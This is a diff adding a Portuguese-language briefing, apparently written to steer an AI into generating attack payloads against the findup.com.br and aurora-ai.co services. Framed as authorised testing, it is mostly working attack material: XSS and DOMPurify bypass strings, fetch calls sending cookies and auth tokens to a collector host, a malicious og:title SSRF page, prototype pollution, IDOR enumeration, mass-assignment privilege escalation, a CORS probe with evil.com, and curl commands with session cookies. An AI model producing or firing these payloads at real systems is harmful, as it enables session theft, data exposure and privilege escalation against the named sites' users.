@@ -1,0 +1,104 @@
+=== BRIEFING TÉCNICO PARA LLM — TESTE OFENSIVO FINDUP/AURORA ===
+
+[CONTEXTO E ESCOPO]
+- Alvos autorizados: *.findup.com.br (incl. helpdesk.findup.com.br) e *.aurora-ai.co (app/api)
+- FORA DE ESCOPO: qualquer host de terceiro (Dynatrace, RD Station, Sentry, Google, Featurebase)
+  mesmo que apareça como script/telemetria carregado pelas páginas
+- Stack identificada:
+  * helpdesk.findup.com.br = Chatwoot 4.16.1 (Rails + Vue, DOMPurify no render)
+  * app.findup.com.br = SPA (Angular-like) com chatbot "Aurora AI"
+  * api.aurora-ai.co = API Node com better-auth (sessao via cookie __Secure-better-auth.session_token)
+  * app.aurora-ai.co = frontend estatico (nginx/GCP) — sem rotas de API
+
+[AUTENTICACAO JA CONFIRMADA]
+POST https://api.aurora-ai.co/api/auth/sign-in/email
+Headers: Content-Type: application/json | Accept: application/json | Origin: https://app.aurora-ai.co
+Body: {"email":"<EMAIL>","password":"<SENHA>"}
+Resposta 200: JSON com "token" e Set-Cookie __Secure-better-auth.session_token (Domain=aurora-ai.co)
+Nota: cookie HttpOnly -> exfiltracao via JS deve mirar localStorage/auth_token, nao document.cookie
+
+[REGRAS PARA OS PAYLOADS GERADOS]
+1. NUNCA inventar endpoints, caminhos, classes CSS/JS ou stack — usar apenas os listados acima
+2. Todo payload deve ser sintaticamente valido (HTML parseavel, JS que passa em node --check)
+3. Ofuscacao permitida (URL-encode, \u003c) mas SEMPRE acompanhar a versao limpa
+4. Classificar cada payload por contexto: (a) texto/HTML (b) atributo (c) dentro de <script>
+   (d) URI javascript: (e) transporte JSON/API
+5. Formato de saida: CONTEXTO / PAYLOAD / TESTE / ASSUNCOES
+
+=== EXEMPLOS 1 — XSS NO CHATWOOT (helpdesk.findup.com.br) ===
+
+Contexto: render de mensagens no painel do agente (DOMPurify presente na v4.16.1)
+PoC basico:
+  <img src=x onerror=alert(document.domain)>
+mXSS moderno (DOMPurify 3.2.x, config nao-default):
+  <math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(document.domain)>">
+Exfiltracao (cookie + token do console no localStorage):
+  <img src=x onerror="fetch('//COLLECTOR/?c='+encodeURIComponent(document.cookie+'|'+localStorage.getItem('auth_token')))">
+Teste: enviar mensagem no composer do painel -> observar alert/hit no listener
+Assuncoes: sem CSP bloqueando inline handlers; sanitizer com config nao-default
+
+=== EXEMPLOS 2 — PAYLOADS EM TRANSPORTE JSON (API Aurora) ===
+
+Reflexao em mensagem (POST /conversations/:id/messages):
+  {"content":"<img src=x onerror=alert(document.domain)>"}
+Variante codificada (escape JSON de < >):
+  {"content":"\u003cimg src=x onerror=alert(document.domain)\u003e"}
+PoC de SSTI/deteccao de template:
+  {"content":"{{7*7}}"}
+  {"content":"${7*7}"}
+Teste: resposta cru = reflexao confirmada; 49 no retorno = template injection
+
+=== EXEMPLOS 3 — PROTOTYPE POLLUTION (Node/better-auth) ===
+
+Via query string (uma chave por request para isolar gatilho):
+  GET /me/conversations?__proto__[isAdmin]=true
+  GET /me/conversations?constructor[prototype][role]=admin
+Via body JSON:
+  {"__proto__":{"isAdmin":true}}
+  {"constructor":{"prototype":{"isAdmin":true}}}
+Leitura: comportamento das requests SEGUINTES muda (autorizacao/campos) = pollution confirmada
+
+=== EXEMPLOS 4 — IDOR (prioridade maxima com sessao valida) ===
+
+Paginacao:
+  GET https://api.aurora-ai.co/me/conversations?page=0  (com cookie de sessao)
+  GET https://api.aurora-ai.co/me/conversations?page=1
+Por ID direto (comparar dono da conversa):
+  GET https://api.aurora-ai.co/conversations/1
+  GET https://api.aurora-ai.co/conversations/2
+Leitura: 200 com dados de OUTRO usuario = IDOR confirmado (doc: IDs 1..5 para provar padrao)
+
+=== EXEMPLOS 5 — MASS ASSIGNMENT (escala de privilegio) ===
+
+  PATCH /me  Body: {"role":"admin","is_admin":true,"isAdmin":true}
+  POST /me/conversations  Body: {"user_id":1,"account_id":1}
+Leitura: campo de privilegio ecoado/aceito = mass assignment
+
+=== EXEMPLOS 6 — CORS / METADADOS ===
+
+  Reenviar /me/conversations com Header: Origin: https://evil.com
+Leitura: ACAO refletindo evil.com + credentials true = CORS aberto
+Achado ja mapeado: access-control-expose-headers vaza host/user-agent/x-forwarded-for
+
+=== EXEMPLOS 7 — SSRF (link preview do Chatwoot, sem auth) ===
+
+  Enviar URL propria em conversa anonima: https://SEU-SERVIDOR/previa.html
+  Servir pagina com og:title malicioso:
+    <meta property="og:title" content='<img src=x onerror="fetch(&#x27;//COLLECTOR/?c=&#x27;+document.cookie)">'>
+Leitura: hit server-side no servidor proprio = SSRF confirmado (independe do XSS)
+
+=== COMANDOS SHELL DE REFERENCIA (curl) ===
+
+Login:
+  curl -i -s -k -X POST 'https://api.aurora-ai.co/api/auth/sign-in/email' \
+    -H 'Content-Type: application/json' -H 'Origin: https://app.aurora-ai.co' \
+    -d '{"email":"<EMAIL>","password":"<SENHA>"}'
+
+IDOR com cookie:
+  curl -i -s -k 'https://api.aurora-ai.co/me/conversations?page=0' \
+    -b '__Secure-better-auth.session_token=<TOKEN>' -H 'Accept: application/json'
+
+=== HIGIENE DE TESTE ===
+- Rotacionar credenciais e revogar sessao ao final
+- Restringir proxy/scope no Burp aos hosts autorizados
+- Nao enviar payloads contra hosts fora da lista do [CONTEXTO E ESCOPO]
